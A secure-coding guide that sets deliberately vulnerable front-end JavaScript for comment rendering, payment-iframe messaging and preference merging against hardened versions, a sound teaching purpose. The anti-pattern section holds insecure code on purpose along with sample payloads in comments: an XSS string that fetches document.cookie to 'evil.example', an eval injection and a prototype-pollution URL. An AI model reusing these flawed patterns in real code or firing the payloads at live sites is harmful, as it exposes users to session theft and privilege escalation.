# Practical Examples

## Anti-Pattern (What NOT to do)

### 1. Rendering user comments
```javascript
// src/comments/render-comment.js
export function renderComment(list, comment) {
  const li = document.createElement('li');
  li.innerHTML = `
    <a href="${comment.author.website}" target="_blank">${comment.author.name}</a>
    <div class="body">${comment.bodyHtml}</div>`;
  list.appendChild(li);
}

// home-made "security" filter
export function isSafeUrl(url) {
  return !url.startsWith('javascript:');   // bypassed by "JavaScript:", " javascript:", "\tjavascript:"
}

export function initFromUrl() {
  const params = new URLSearchParams(location.search);
  // ?highlight=<img src=x onerror=fetch('//evil.example/?c='+document.cookie)>
  document.querySelector('#summary').innerHTML = `Results for <b>${params.get('highlight')}</b>`;
  // ?post=alert(document.domain) -> the string is evaluated as code
  setTimeout(`loadComments(${params.get('post')})`, 30000);
}
```
**Why it's wrong:** author name, website, and comment body end up in `innerHTML` without sanitization (stored XSS); the `startsWith` filter can be bypassed and is not even used; URL parameters are a source of reflected DOM XSS; `setTimeout` with a string is equivalent to `eval`; `target="_blank"` without `rel` exposes the page to reverse tabnabbing.

### 2. Communicating with the payment iframe
```javascript
// src/checkout/payment-frame.js
const frame = document.querySelector('#payment-frame');

export function startPayment(order, sessionToken) {
  // '*': any document loaded in the iframe (even after a redirect) receives the token
  frame.contentWindow.postMessage({ type: 'init', order, sessionToken }, '*');
}

window.addEventListener('message', (event) => {
  // substring check: https://pay.example.com.evil.io passes too
  if (!event.origin.includes('pay.example.com')) return;
  const msg = typeof event.data === 'string' ? JSON.parse(event.data) : event.data;
  if (msg.type === 'resize') frame.style.height = msg.height;
  if (msg.type === 'redirect') location.href = msg.url;                         // javascript: or open redirect
  if (msg.type === 'status') document.querySelector('#status').innerHTML = msg.text;
});
```
**Why it's wrong:** `targetOrigin: '*'` delivers the session token to any origin that loads the frame; the `includes()` check accepts attacker domains; `event.source` and the data shape are not verified and `JSON.parse` can throw; the message can force arbitrary navigations and inject HTML.

### 3. Merging preferences and handling the token
```javascript
// src/settings/preferences.js
export function deepMerge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      target[key] = target[key] || {};
      deepMerge(target[key], source[key]);   // with key === '__proto__' it writes to Object.prototype
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// preferences shareable via URL: ?prefs={"__proto__":{"isAdmin":true}}
const shared = JSON.parse(new URLSearchParams(location.search).get('prefs') ?? '{}');
export const preferences = deepMerge({ theme: 'light' }, shared);

// from this point on ({}).isAdmin === true across the whole application
export const canDeleteUsers = (user) => user.isAdmin;

export function onLogin(response) {
  localStorage.setItem('accessToken', response.accessToken);   // readable by any XSS
  localStorage.setItem('refreshToken', response.refreshToken);
}
```
**Why it's wrong:** `JSON.parse` creates an own `__proto__` property and the recursive merge uses it to write to `Object.prototype`, altering the authorization checks of the entire application; `for...in` also iterates inherited properties; tokens in `localStorage` can be exfiltrated by any injected script and survive closing the tab.

## Best Practice (How to do it right)

### 1. Rendering user comments
```javascript
// src/features/comments/render-comment.js
// @ts-check
import DOMPurify from 'dompurify';

const ALLOWED_PROTOCOLS = new Set(['https:', 'http:', 'mailto:']);

/**
 * Returns a safe href or null: blocks javascript:, data:, vbscript:.
 * @param {string} raw
 * @returns {string | null}
 */
export function toSafeHref(raw) {
  if (!URL.canParse(raw, location.origin)) return null;
  const url = new URL(raw, location.origin);
  return ALLOWED_PROTOCOLS.has(url.protocol) ? url.href : null;
}

/**
 * Rich HTML always sanitized with an allowlist; where Trusted Types are supported
 * (Chromium) DOMPurify returns a TrustedHTML created by its 'dompurify' policy.
 * @param {HTMLElement} target
 * @param {string} dirty
 */
export function setRichText(target, dirty) {
  const clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'code', 'pre'],
    ALLOWED_ATTR: [],
    RETURN_TRUSTED_TYPE: 'trustedTypes' in window,
  });
  target.innerHTML = /** @type {string} */ (clean);
}

/**
 * @param {HTMLTemplateElement} template <li><a class="author"></a><div class="body"></div></li>
 * @param {{ author: { name: string, website: string }, bodyHtml: string }} comment
 */
export function renderComment(template, comment) {
  const fragment = /** @type {DocumentFragment} */ (template.content.cloneNode(true));
  const link = /** @type {HTMLAnchorElement} */ (fragment.querySelector('a.author'));
  link.textContent = comment.author.name;                  // text, never markup
  const href = toSafeHref(comment.author.website);
  if (href) Object.assign(link, { href, target: '_blank', rel: 'noopener noreferrer' });
  setRichText(/** @type {HTMLElement} */ (fragment.querySelector('.body')), comment.bodyHtml);
  return fragment;
}

/**
 * @param {HTMLElement} summary
 * @param {(postId: string) => void} loadComments
 */
export function initFromUrl(summary, loadComments) {
  const params = new URLSearchParams(location.search);     // untrusted source
  const bold = document.createElement('b');
  bold.textContent = params.get('highlight') ?? '';
  summary.replaceChildren('Results for ', bold);
  const postId = params.get('post') ?? '';
  return setTimeout(() => loadComments(postId), 30_000);   // a function, never a string
}
```
**Why it's right:** text data goes only through `textContent` and `replaceChildren()`; URLs are validated with the native parser and a protocol allowlist, so uppercase letters and leading spaces cannot bypass the check; rich HTML always goes through DOMPurify with an allowlist and is compatible with the CSP `require-trusted-types-for 'script'`; external links have `rel="noopener noreferrer"` and the timer receives a function.

### 2. Communicating with the payment iframe
```javascript
// src/features/checkout/payment-frame.js
// @ts-check
const PAYMENT_ORIGIN = 'https://pay.example.com';

/**
 * @param {HTMLIFrameElement} frame
 * @param {{ orderId: string, amountCents: number }} order
 * @param {{ onStatus: (text: string) => void, onCompleted: (orderId: string) => void }} handlers
 * @param {AbortSignal} signal
 */
export function connectPaymentFrame(frame, order, handlers, signal) {
  window.addEventListener('message', (event) => {
    // exact origin and expected source: discard messages from other windows or iframes
    if (event.origin !== PAYMENT_ORIGIN || event.source !== frame.contentWindow) return;
    const msg = event.data;
    if (typeof msg !== 'object' || msg === null || typeof msg.type !== 'string') return;

    switch (msg.type) {
      case 'ready':
        // no session token: the iframe authenticates with its own backend
        frame.contentWindow?.postMessage({ type: 'init', orderId: order.orderId, amountCents: order.amountCents }, PAYMENT_ORIGIN);
        break;
      case 'resize':
        if (Number.isFinite(msg.height)) frame.style.height = `${Math.min(Math.max(msg.height, 200), 1200)}px`;
        break;
      case 'status':
        handlers.onStatus(String(msg.text));             // the caller displays it with textContent
        break;
      case 'completed':
        // the next navigation is decided by the app, never by a URL received in the message
        if (msg.orderId === order.orderId) handlers.onCompleted(order.orderId);
        break;
      default:
        break;
    }
  }, { signal });
}
```
**Why it's right:** the origin is compared with `===` and the sender with `event.source`, so look-alike domains or other frames are ignored; the explicit `targetOrigin` guarantees that data reaches only the expected provider; every message field is validated for type and range; no token leaves the page and the listener is removed via the `signal`.

### 3. Merging preferences and handling the token
```javascript
// src/features/settings/preferences.js
// @ts-check
const FORBIDDEN_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

/**
 * @param {unknown} value
 * @returns {value is Record<string, unknown>}
 */
function isPlainObject(value) {
  if (typeof value !== 'object' || value === null) return false;
  const proto = Object.getPrototypeOf(value);
  return proto === Object.prototype || proto === null;
}

/**
 * Safe deep merge: own properties only, dangerous keys discarded,
 * nested objects created without a prototype.
 * @param {Record<string, unknown>} target
 * @param {unknown} source
 * @returns {Record<string, unknown>}
 */
export function safeDeepMerge(target, source) {
  if (!isPlainObject(source)) return target;
  for (const [key, value] of Object.entries(source)) {
    if (FORBIDDEN_KEYS.has(key)) continue;
    const current = Object.hasOwn(target, key) ? target[key] : undefined;
    target[key] = isPlainObject(value)
      ? safeDeepMerge(isPlainObject(current) ? current : Object.create(null), value)
      : value;
  }
  return target;
}

/**
 * The server responds with Set-Cookie: session=<id>; HttpOnly; Secure; SameSite=Lax; Path=/
 * JavaScript never sees the token, so an XSS cannot exfiltrate it.
 * @param {{ email: string, password: string }} credentials
 */
export async function login(credentials) {
  const response = await fetch('/api/session', {
    method: 'POST',
    credentials: 'same-origin',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(credentials),
    signal: AbortSignal.timeout(10_000),
  });
  if (!response.ok) throw new Error(`Login failed: HTTP ${response.status}`);
  return /** @type {{ displayName: string }} */ (await response.json()); // profile data only
}
```
**Why it's right:** `Object.entries()` considers only own properties and the `__proto__`, `constructor`, and `prototype` keys are discarded, so `Object.prototype` stays intact; `Object.hasOwn()` avoids reading inherited values; for preferences shared via URL an allowlist of permitted keys and values is added; the token lives in an `HttpOnly` cookie inaccessible to scripts.
